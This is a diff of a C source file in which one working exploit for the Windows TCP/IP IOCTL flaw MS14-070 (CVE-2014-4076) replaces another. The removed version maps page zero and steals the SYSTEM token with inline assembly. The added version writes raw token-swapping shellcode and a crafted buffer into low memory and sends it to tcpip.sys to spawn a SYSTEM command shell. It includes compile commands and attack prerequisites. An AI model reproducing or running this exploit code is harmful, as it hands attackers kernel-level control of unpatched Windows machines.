@@ -1,335 +1,423 @@
-//
-// An exploit for the MS14-070 / CVE-2014-4076 (KB2989935), written by dev_zzo.
-// Partially based on the original PoC [0] released by KoreLogic.
-//
-// Affected systems:
-// + Windows Server 2003 R2 SP2 (x86, x64?)
-// + Windows XP SP3 (x86, x64?)
-//
-// What is the root cause of the vulnerability?
-//
-// It is caused due to a NULL pointer dereference within the tcpip!SetAddrOptions()
-// function. The NULL pointer comes from an internal object, it is not known
-// how/when it can be altered to prevent exploitation.
-//
-// The function can be reached via IOCTL 0x00120028U called on \\.\Tcp file object.
-// The IOCTL apparently requests an option to be set.
-//
-// The IOCTL accepts an input buffer of minimum 0x18 bytes, with certain values 
-// required to reach the flawed code path and others having arbitrary values; 
-// see code below. No value influences the follow-up exploitation.
-//
-// The internal object contains what appears to be a flag field at offset +0x28.
-// Setting it to 0x38FFFF87U (provided by KoreLogic) allows for code execution.
-// The SetAddrOptions() function invokes another function named ProcessAORequests()
-// passing it the same internal object. The ProcessAORequests() function enters a loop 
-// checking the flags against mask 0x00060007U. Another check within loop 
-// verifies bit mask 0x00000004. If this is satisfied, the pointer at +0x10 is
-// checked, if it is different from the address of itself (apparently, a single-linked
-// loop list). If so, a list element is extracted. Then, a pointer at +0xEC is fetched
-// and subsequently called. The pointer value is controlled by the attacker.
-//
-// References:
-// [0] https://www.korelogic.com/Resources/Advisories/KL-001-2015-001.txt
-// [1] https://technet.microsoft.com/en-us/library/security/ms14-070.aspx
-//
+/*
+################################################################
+# Exploit Title: Windows 2k3 SP2 TCP/IP IOCTL Privilege Escalation (MS14-070)
+# Date: 2015-08-10
+# Exploit Author: Tomislav Paskalev
+# Vulnerable Software:
+#   Windows 2003 SP2 x86
+#   Windows 2003 SP2 x86-64
+#   Windows 2003 SP2 IA-64
+# Supported vulnerable software:
+#   Windows 2003 SP2 x86
+# Tested on:
+#   Windows 2003 SP2 x86 EN
+# CVE ID:   2014-4076
+# OSVDB-ID: 114532
+################################################################
+# Vulnerability description:
+#   Windows TCP/IP stack (tcpip.sys, tcpip6.sys) fails to
+#   properly handle objects in memory during IOCTL processing.
+#   By crafting an input buffer that will be passed to the TCP
+#   device through the DeviceIoControlFile() function, it is
+#   possible to trigger a vulnerability that would allow an
+#   attacker to elevate privileges.
+#   An attacker who successfully exploited this vulnerability
+#   could run arbitrary code in kernel mode (i.e. with SYSTEM
+#   privileges).
+################################################################
+# Exploit notes:
+#   Privileged shell execution:
+#     - the SYSTEM shell will spawn within the existing shell
+#       (i.e. exploit usable via a remote shell)
+#       - upon exiting the SYSTEM shell, the parent process
+#         will become unresponsive/hang
+#   Exploit compiling:
+#     - # i586-mingw32msvc-gcc MS14-070.c -o MS14-070.exe
+#   Exploit prerequisites:
+#     - low privilege access to the target (remote shell or RDP)
+#     - target not patched (KB2989935 not installed)
+################################################################
+# Patch:
+#   https://www.microsoft.com/en-us/download/details.aspx?id=44646
+################################################################
+# Thanks to:
+#   KoreLogic (Python PoC)
+#   ChiChou (C++ PoC)
+################################################################
+# References:
+#   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-4076
+#   https://technet.microsoft.com/library/security/ms14-070
+#   https://www.exploit-db.com/exploits/35936/
+#   https://github.com/ChiChou/CVE-2014-4076/blob/master/CVE-2014-4076/CVE-2014-4076.cpp
+#   https://www.osronline.com/article.cfm?article=229
+################################################################
+*/
 
-#include <Windows.h>
 
-#pragma comment(linker, "/entry:__mainCRTStartup")
-#pragma comment(linker, "/subsystem:console")
-#pragma comment(lib, "kernel32")
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 
-#define NTVER(maj, min, csd) ((maj << 24) | (min << 16) | (csd << 8))
-// Windows 2000 SP4 UR1
-//#define NTOS_TARGET_VER NTVER(5,0,4)
-// Windows XP SP3
-//#define NTOS_TARGET_VER NTVER(5,1,3)
-// Windows Server 2003 R2 SP2
-//#define NTOS_TARGET_VER NTVER(5,2,2)
 
-typedef NTSYSAPI NTSTATUS (NTAPI *PNTALLOCATEVIRTUALMEMORY)(
-    HANDLE ProcessHandle,
-    PVOID *BaseAddress,
-    ULONG_PTR ZeroBits,
-    PSIZE_T RegionSize,
-    ULONG AllocationType,
-    ULONG Protect);
-static PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory;
 
-//
-// Scrap CRT...
-//
 
-#pragma function(memset)
-void *memset(void *ptr, int v, size_t num)
+typedef enum _SYSTEM_INFORMATION_CLASS {
+        SystemBasicInformation                = 0,
+        SystemPerformanceInformation          = 2,
+        SystemTimeOfDayInformation            = 3,
+        SystemProcessInformation              = 5,
+        SystemProcessorPerformanceInformation = 8,
+        SystemInterruptInformation            = 23,
+        SystemExceptionInformation            = 33,
+        SystemRegistryQuotaInformation        = 37,
+        SystemLookasideInformation            = 45
+} SYSTEM_INFORMATION_CLASS;
+
+
+typedef DWORD NTSTATUS;
+NTSTATUS WINAPI NtQuerySystemInformation (
+        SYSTEM_INFORMATION_CLASS   SystemInformationClass,
+        PVOID                      SystemInformation,
+        ULONG                      SystemInformationLength,
+        PULONG                     ReturnLength
+);
+
+
+typedef struct _IO_STATUS_BLOCK {
+        union {
+                NTSTATUS           Status;
+                PVOID              Pointer;
+        };
+        ULONG_PTR                  Information;
+} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
+
+
+typedef void (WINAPI * PIO_APC_ROUTINE) (PVOID, PIO_STATUS_BLOCK, ULONG);
+
+
+NTSTATUS (WINAPI *ZwAllocateVirtualMemory) (
+        HANDLE                     ProcessHandle,
+        PVOID                      *BaseAddress,
+        ULONG_PTR                  ZeroBits,
+        PSIZE_T                    RegionSize,
+        ULONG                      AllocationType,
+        ULONG                      Protect
+);
+
+
+NTSTATUS (WINAPI *ZwDeviceIoControlFile) (
+        HANDLE                     FileHandle,
+        PVOID                      ApcContext,
+        PIO_STATUS_BLOCK           IoStatusBlock,
+        ULONG                      IoControlCode,
+        PVOID                      InputBuffer,
+        ULONG                      InputBufferLength,
+        PVOID                      OutputBuffer,
+        ULONG                      OutputBufferLength
+);
+
+
+
+
+BOOL WINAPI CreateNewCmdProcess (STARTUPINFO *startupInformation, PROCESS_INFORMATION *processInformation)
 {
-    char *p = (char *)ptr;
-    while (num--)
-        *p++ = 0;
-    return ptr;
+        ZeroMemory (&startupInformation[0], sizeof (STARTUPINFO));
+        startupInformation->cb = sizeof (STARTUPINFO);
+        ZeroMemory (&processInformation[0], sizeof (PROCESS_INFORMATION));
+
+        // Start the child process.
+        return CreateProcess (
+                NULL,                                                           // No module name (use command line)
+                "c:\\windows\\system32\\cmd.exe /K cd c:\\windows\\system32",   // Start cmd.exe
+                NULL,                                                           // Process handle not inheritable
+                NULL,                                                           // Thread handle not inheritable
+                TRUE,                                                           // Set handle inheritance to TRUE
+                0,                                                              // No creation flags
+                NULL,                                                           // Use parent's environment block
+                NULL,                                                           // Use parent's starting directory
+                &startupInformation[0],                                         // Pointer to STARTUPINFO structure
+                &processInformation[0]                                          // Pointer to PROCESS_INFORMATION structure
+        );
 }
 
-static size_t __strlen(const char *s)
+
+
+
+unsigned long SwapBytes (unsigned long inputByteUL)
 {
-    const char *p = s;
-    while (*p) ++p;
-    return p - s;
+        return (((inputByteUL&0x000000FF) << 24) + ((inputByteUL&0x0000FF00) << 8) +
+        ((inputByteUL&0x00FF0000) >> 8) + ((inputByteUL&0xFF000000) >> 24));
 }
 
-typedef int (__cdecl *pvsprintf)(char *buffer, const char *format, va_list argptr); 
-static pvsprintf vsprintf; 
 
-static void __puts(const char *text)
+
+
+BOOL WriteToAllocMem (unsigned char *exploitBuffer, unsigned char *shellcode)
 {
-    DWORD charsWritten;
-    WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), text, __strlen(text), &charsWritten, NULL);
+        int returnAllocMemValue1, returnAllocMemValue2, returnAllocMemValue3, returnAllocMemValue4, returnAllocMemValue5;
+
+        returnAllocMemValue1 = WriteProcessMemory (
+                (HANDLE) 0xFFFFFFFF,
+                (LPVOID) 0x28,
+                "\x87\xff\xff\x38",
+                4,
+                NULL
+        );
+        returnAllocMemValue2 = WriteProcessMemory (
+                (HANDLE) 0xFFFFFFFF,
+                (LPVOID) 0x38,
+                "\x00\x00",
+                2,
+                NULL
+        );
+        returnAllocMemValue3 = WriteProcessMemory (
+                (HANDLE) 0xFFFFFFFF,
+                (LPVOID) 0x1100,
+                &exploitBuffer[0],
+                32,
+                NULL
+        );
+        returnAllocMemValue4 = WriteProcessMemory (
+                (HANDLE) 0xFFFFFFFF,
+                (LPVOID) 0x2b,
+                "\x00\x00",
+                2,
+                NULL
+        );
+        returnAllocMemValue5 = WriteProcessMemory (
+                (HANDLE) 0xFFFFFFFF,
+                (LPVOID) 0x2000,
+                &shellcode[0],
+                96,
+                NULL
+        );
+
+        if (returnAllocMemValue1 == 0 ||
+        returnAllocMemValue2 == 0 ||
+        returnAllocMemValue3 == 0 ||
+        returnAllocMemValue4 == 0 ||
+        returnAllocMemValue5 == 0)
+                return FALSE;
+        else
+                return TRUE;
 }
 
-static int __printf(const char *fmt, ...)
+
+
+
+int main (void)
 {
-    char buffer[1024];
-    int length;
-    DWORD charsWritten;
-    va_list args;
+        fprintf (stderr, "[*] MS14-070 (CVE-2014-4076) x86\n");
+        fprintf (stderr, "    [*] by Tomislav Paskalev\n");
+        fflush (stderr);
 
-    va_start(args, fmt);
-    length = vsprintf(buffer, fmt, args);
-    WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), buffer, length, &charsWritten, NULL);
-    va_end(args);
-    return length;
-}
 
-static void GrabNtdllRoutines(void)
-{
-    HMODULE hNtdll;
+        ////////////////////////////////
+        // CREATE NEW CME.EXE PROCESS
+        ////////////////////////////////
 
-    hNtdll = GetModuleHandleA("ntdll.dll");
-    vsprintf = (pvsprintf)GetProcAddress(hNtdll, "vsprintf");
-    NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
-}
+        STARTUPINFO *startupInformation = (STARTUPINFO *) malloc (sizeof (STARTUPINFO));
+        PROCESS_INFORMATION *processInformation = (PROCESS_INFORMATION *) malloc (sizeof (PROCESS_INFORMATION));
 
-static NTSTATUS MapPageZero(SIZE_T Size)
-{
-	PVOID BaseAddress = (PVOID)1;
+        if (!CreateNewCmdProcess (&startupInformation[0], &processInformation[0]))
+        {
+                fprintf (stderr, "[-] Creating a new process failed\n");
+                fprintf (stderr, "    [*] Error code   : %d\n", GetLastError());
+                fflush (stderr);
+                ExitProcess (1);
+        }
 
-	return NtAllocateVirtualMemory((PVOID)-1, &BaseAddress, 0, &Size, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
-}
+        fprintf (stderr, "[+] Created a new cmd.exe process\n");
+        fflush (stderr);
 
-// This is the object dereferenced with NULL
 
-#if (NTOS_TARGET_VER == NTVER(5,0,4))
+        ////////////////////////////////
+        // CONVERT PID TO HEX LE
+        ////////////////////////////////
 
-typedef struct {
-/*0000*/BYTE __fog1[0x08];
-/*0008*/DWORD Zero1; // RBZ
-/*000C*/PVOID Ptr1;
-/*0010*/PVOID Ptr2;
-/*0014*/BYTE __fog2[0x10];
-/*0024*/DWORD Flags;
-/*0028*/BYTE __fog3[0xC];
-/*0034*/WORD Zero2; // RBZ
-/*0036*/BYTE __fog4[0xB2];
-/*00E8*/PVOID CallbackPtr;
-} OBJECT, *POBJECT;
+        unsigned long pidLittleEndian = SwapBytes ((unsigned long) processInformation->dwProcessId);
+        fprintf (stderr, "    [*] PID [dec]    :   %#8lu\n", (unsigned long) processInformation->dwProcessId);
+        fprintf (stderr, "    [*] PID [hex]    : %#010x\n", (unsigned long) processInformation->dwProcessId);
+        fprintf (stderr, "    [*] PID [hex LE] : %#010x\n", pidLittleEndian);
 
-#define SYSTEM_PID 8
-#define OFFSET_KPCR_KTHREAD 0x124
-#define OFFSET_KTHREAD_KPROCESS 0x44
-#define OFFSET_EPROCESS_UNIQUEPID 0x9C
-#define OFFSET_EPROCESS_APLINKS 0xA0
-#define OFFSET_EPROCESS_TOKEN 0x12C
+        /*four bytes of hex = 8 characters, plus NULL terminator*/
+        unsigned char pidLittleEndianString[9];
 
-#elif (NTOS_TARGET_VER == NTVER(5,1,3))
+        sprintf (&pidLittleEndianString[0], "%04x", pidLittleEndian);
 
-typedef struct {
-/*0000*/BYTE __fog1[0x08];
-/*0008*/DWORD Zero1; // RBZ
-/*000C*/PVOID Ptr1;
-/*0010*/PVOID Ptr2;
-/*0014*/BYTE __fog2[0x10];
-/*0024*/DWORD Flags;
-/*0028*/BYTE __fog3[0xC];
-/*0034*/WORD Zero2; // RBZ
-/*0036*/BYTE __fog4[0xB2];
-/*00E8*/PVOID CallbackPtr;
-} OBJECT, *POBJECT;
 
-#define SYSTEM_PID 4
-#define OFFSET_KPCR_KTHREAD 0x124
-#define OFFSET_KTHREAD_KPROCESS 0x44
-#define OFFSET_EPROCESS_UNIQUEPID 0x84
-#define OFFSET_EPROCESS_APLINKS 0x88
-#define OFFSET_EPROCESS_TOKEN 0xC8
+        ////////////////////////////////
+        // CREATE SHELLCODE
+        ////////////////////////////////
 
-#elif (NTOS_TARGET_VER == NTVER(5,2,2))
+        unsigned char exploitBuffer[] =
+        "\x00\x04\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00"
+        "\x22\x00\x00\x00\x04\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00";
+        unsigned char shellcode[] =
+        "\x60\x64\xA1\x24\x01\x00\x00\x8B\x40\x38\x50\xBB\x04\x00\x00\x00"
+        "\x8B\x80\x98\x00\x00\x00\x2D\x98\x00\x00\x00\x39\x98\x94\x00\x00"
+        "\x00\x75\xED\x8B\xB8\xD8\x00\x00\x00\x83\xE7\xF8\x58\xBB\x41\x41"
+        "\x41\x41\x8B\x80\x98\x00\x00\x00\x2D\x98\x00\x00\x00\x39\x98\x94"
+        "\x00\x00\x00\x75\xED\x89\xB8\xD8\x00\x00\x00\x61\xBA\x11\x11\x11"
+        "\x11\xB9\x22\x22\x22\x22\xB8\x3B\x00\x00\x00\x8E\xE0\x0F\x35\x00";
 
-typedef struct {
-/*0000*/BYTE __fog1[0x0C];
-/*000C*/DWORD Zero1; // RBZ
-/*0010*/PVOID Ptr1;
-/*0014*/PVOID Ptr2;
-/*0018*/BYTE __fog2[0x10];
-/*0028*/DWORD Flags;
-/*002C*/BYTE __fog3[0xC];
-/*0038*/WORD Zero2; // RBZ
-/*003A*/BYTE __fog4[0xB2];
-/*00EC*/PVOID CallbackPtr;
-} OBJECT, *POBJECT;
+        int counter;
+        for (counter = 0; counter < 4; counter++)
+        {
+                char buffer[3] = {pidLittleEndianString[counter * 2], pidLittleEndianString[(counter * 2) + 1], 0};
+                shellcode[46 + counter] = strtol (buffer, NULL, 16);
+        }
 
-#define SYSTEM_PID 4
-#define OFFSET_KPCR_KTHREAD 0x124
-#define OFFSET_KTHREAD_KPROCESS 0x128
-#define OFFSET_EPROCESS_UNIQUEPID 0x94
-#define OFFSET_EPROCESS_APLINKS 0x98
-#define OFFSET_EPROCESS_TOKEN 0xD8
+        shellcode[77] = strtol ("39", NULL, 16);
+        shellcode[78] = strtol ("ff", NULL, 16);
+        shellcode[79] = strtol ("a2", NULL, 16);
+        shellcode[80] = strtol ("ba", NULL, 16);
 
-#else
-#error Please define NTOS_TARGET_VER.
-#endif
+        shellcode[82] = strtol ("0", NULL, 16);
+        shellcode[83] = strtol ("0", NULL, 16);
+        shellcode[84] = strtol ("0", NULL, 16);
+        shellcode[85] = strtol ("0", NULL, 16);
 
-static void TokenStealer(void)
-{
-    __asm {
-        mov   eax, fs:[OFFSET_KPCR_KTHREAD]
-        mov   eax, [eax + OFFSET_KTHREAD_KPROCESS]
-        push  eax
+        fprintf (stderr, "[+] Modified shellcode\n");
+        fflush (stderr);
 
-aplinks_loop:
-        mov   eax, [eax + OFFSET_EPROCESS_APLINKS]
-        lea   eax, [eax - OFFSET_EPROCESS_APLINKS]
-        cmp   dword ptr [eax + OFFSET_EPROCESS_UNIQUEPID], SYSTEM_PID
-        jne   aplinks_loop
 
-        mov   eax, [eax + OFFSET_EPROCESS_TOKEN]
-        pop   edx
-        mov   [edx + OFFSET_EPROCESS_TOKEN], eax
-    }
-}
+        ////////////////////////////////
+        // CREATE HANDLE ON TCPIP.SYS
+        ////////////////////////////////
 
-static int PayloadExecuted = 0;
+        HANDLE tcpIPDeviceHandle = CreateFileA (
+                "\\\\.\\Tcp",
+                0,
+                0,
+                NULL,
+                OPEN_EXISTING,
+                0,
+                NULL
+        );
 
-static void __stdcall Callback(POBJECT Obj, void *b)
-{
-    /* Executed in kernel mode */
-    PayloadExecuted = 1;
+        if (tcpIPDeviceHandle == INVALID_HANDLE_VALUE)
+        {
+                printf ("[-] Opening TCP/IP I/O dev failed\n");
+                printf ("    [*] Error code   : %d\n", GetLastError());
+                ExitProcess (1);
+        }
 
-    Obj->Flags &= ~0x00060007;
-    TokenStealer();
-    return;
-}
+        fprintf (stderr, "[+] Opened TCP/IP I/O device\n");
+        fflush (stderr);
 
-static int SpawnCmd(void)
-{
-	STARTUPINFOA StartInfo;
-	PROCESS_INFORMATION ProcInfo;
-    BOOL Success;
 
-    memset(&StartInfo, 0, sizeof(StartInfo));
-    StartInfo.cb = sizeof(StartInfo);
-	Success = CreateProcessA(
-		NULL,
-		"C:\\windows\\system32\\cmd.exe",
-		NULL,
-		NULL,
-		TRUE,
-		CREATE_NEW_CONSOLE,
-		NULL,
-		NULL,
-		&StartInfo,
-		&ProcInfo);
-    return Success;
-}
+        ////////////////////////////////
+        // ALLOCATE MEMORY - FIRST PAGE
+        ////////////////////////////////
 
-static void Exploit(void)
-{
-    HANDLE hTcp;
-    NTSTATUS Status;
-    BOOL Success;
-    DWORD IoctlInputBuffer[] = {
-        0x00000400, /* Checked in TdiSetInformationEx(), must be 0x400 or 0x401 */
-        0x00000000, /* Checked in TdiSetInformationEx(), must be 0 */
-        0x00000200, /* Checked in TdiSetInformationEx(), must be 0x200 */
-        0x00000200, /* Checked in TdiSetInformationEx(), must be 0x200 */
-        0x00000022, /* Option? */
-        0x00000004, /* Value length? */
-        0x00010000, /* Value data? */
-    };
-    POBJECT Obj = NULL;
+        FARPROC ZwAllocateVirtualMemory;
 
-    GrabNtdllRoutines();
+        ZwAllocateVirtualMemory = GetProcAddress (GetModuleHandle ("NTDLL.DLL"), "ZwAllocateVirtualMemory");
 
-    __puts("\n[.] Opening the device... ");
-    hTcp = CreateFileA(
-        "\\\\.\\Tcp",
-        0,
-        FILE_SHARE_WRITE|FILE_SHARE_READ,
-        NULL,
-        OPEN_EXISTING,
-        0,
-        NULL);
-    if (hTcp == INVALID_HANDLE_VALUE) {
-        __printf("FAILED.\n[-] GetLastError() says: %p", GetLastError());
-        return;
-    }
-    __puts("OK.");
+        fprintf (stderr, "[*] ntdll.dll address: 0x%p\n", ZwAllocateVirtualMemory);
+        fflush (stderr);
 
-    __puts("\n[.] Mapping page zero... ");
-    Status = MapPageZero(0x4000);
-    if (Status) {
-        __printf("FAILED.\n[-] NTSTATUS is: %p", Status);
-        return;
-    }
-    __puts("OK.");
-    Obj->Zero1 = 0;
-    Obj->Ptr1 = &Obj->Ptr2;
-    Obj->Ptr2 = &Obj->Ptr1;
-    Obj->Flags = 0x38FFFF87U;
-    Obj->Zero2 = 0;
-    Obj->CallbackPtr = &Callback;
+        NTSTATUS AllocMemReturnCode;
+        ULONG BaseAddress = 0x1000, RegionSize = 0x4000;
 
-    __puts("\n[.] Invoking IOCTL... ");
-    Success = DeviceIoControl(
-        hTcp,
-        0x00120028U,
-        IoctlInputBuffer, /* lpInBuffer */
-        sizeof(IoctlInputBuffer), /* nInBufferSize */
-        NULL, /* lpOutBuffer */
-        0, /* nOutBufferSize */
-        NULL, /* lpBytesReturned */
-        NULL);
-    if (!Success) {
-        __printf("FAILED.\n[-] GetLastError() says: %p", GetLastError());
-        return;
-    }
-    __puts("OK.");
+        AllocMemReturnCode = ZwAllocateVirtualMemory (
+                (HANDLE) 0xFFFFFFFF,
+                &BaseAddress,
+                0,
+                &RegionSize,
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_EXECUTE_READWRITE
+        );
 
-    __puts("\n[.] Checking whether payload was actually executed... ");
-    if (!PayloadExecuted) {
-        __puts("NOPE.\n");
-        __puts("[-] Sorry about this. Please report to the exploit author.\n");
-        return;
-    }
-    __puts("YEP.");
+        if (AllocMemReturnCode != 0)
+        {
+                printf ("[-] Allocating memory failed\n");
+                printf ("    [*] Error code   : %#X\n", AllocMemReturnCode);
+                ExitProcess (1);
+        }
 
-    __puts("\n[.] Spawning the CMD shell... ");
-    Success = SpawnCmd();
-    if (!Success) {
-        __printf("FAILED.\n[-] GetLastError() says: %p", GetLastError());
-        return;
-    }
-    __puts("OK.");
+        fprintf (stderr, "[+] Allocated memory\n");
+        fprintf (stderr, "    [*] BaseAddress  : 0x%p\n", BaseAddress);
+        fprintf (stderr, "    [*] RegionSize   : %#010x\n", RegionSize);
+        fflush (stderr);
 
-    __puts("\n[+] Exploit successful.");
-}
 
-void __mainCRTStartup(void)
-{
-    __puts("\nExploit for MS14-070 / CVE-2014-4076\n");
-    __puts("More at: https://github.com/dev-zzo/exploits-nt-privesc \n");
+        ////////////////////////////////
+        // WRITE EXPLOIT TO PROCESS MEM
+        ////////////////////////////////
 
-    __puts("\n[!] Exploit starting...");
-    Exploit();
+        fprintf (stderr, "[*] Writing exploit...\n");
+        fflush (stderr);
 
-	__puts("\n[+] XOXO, dev_zzo.\n");
+        if (!WriteToAllocMem (&exploitBuffer[0], &shellcode[0]))
+        {
+                fprintf (stderr, "    [-] Failed to write to memory\n");
+                fprintf (stderr, "        [*] Err code : %d\n", GetLastError ());
+                fflush (stderr);
+                ExitProcess (1);
+        }
+        else
+        {
+                fprintf (stderr, "    [+] done\n");
+                fflush (stderr);
+        }
+
+
+        ////////////////////////////////
+        // SEND EXPLOIT TO TCPIP.SYS
+        ////////////////////////////////
+
+        fprintf (stderr, "[*] Spawning SYSTEM shell...\n");
+        fprintf (stderr, "    [*] Parent proc hangs on exit\n");
+        fflush (stderr);
+
+        FARPROC ZwDeviceIoControlFile;
+        NTSTATUS DevIoCtrlReturnCode;
+        ULONG ioStatus = 8;
+
+        ZwDeviceIoControlFile = GetProcAddress (GetModuleHandle ("NTDLL.DLL"), "ZwDeviceIoControlFile");
+
+        DevIoCtrlReturnCode = ZwDeviceIoControlFile (
+                tcpIPDeviceHandle,
+                NULL,
+                NULL,
+                NULL,
+                (PIO_STATUS_BLOCK) &ioStatus,
+                0x00120028,                                //Device: NETWORK (0x12)
+                                                        //Function: 0xa
+                                                        //Access: FILE_ANY_ACCESS
+                                                        //Method: METHOD_BUFFERED
+                (PVOID) 0x1100,                                //NULL,                //Test
+                32,                                        //0,                //Test
+                NULL,
+                0
+        );
+
+        if (DevIoCtrlReturnCode != 0)
+        {
+                fprintf (stderr, "    [-] Exploit failed (->TCP/IP)\n");
+                fprintf (stderr, "        [*] Err code : %d\n", GetLastError ());
+                fflush (stderr);
+                ExitProcess (1);
+        }
+
+
+        ////////////////////////////////
+        // WAIT FOR CHILD PROCESS; EXIT
+        ////////////////////////////////
+
+        // Wait until child process exits.
+        WaitForSingleObject (processInformation->hProcess, INFINITE);
+
+        fprintf (stderr, "[*] Exiting SYSTEM shell...\n");
+        fflush (stderr);
+
+        // Close process and thread handles.
+        CloseHandle (tcpIPDeviceHandle);
+        CloseHandle (processInformation->hProcess);
+        CloseHandle (processInformation->hThread);
+
+        return 1;
 }
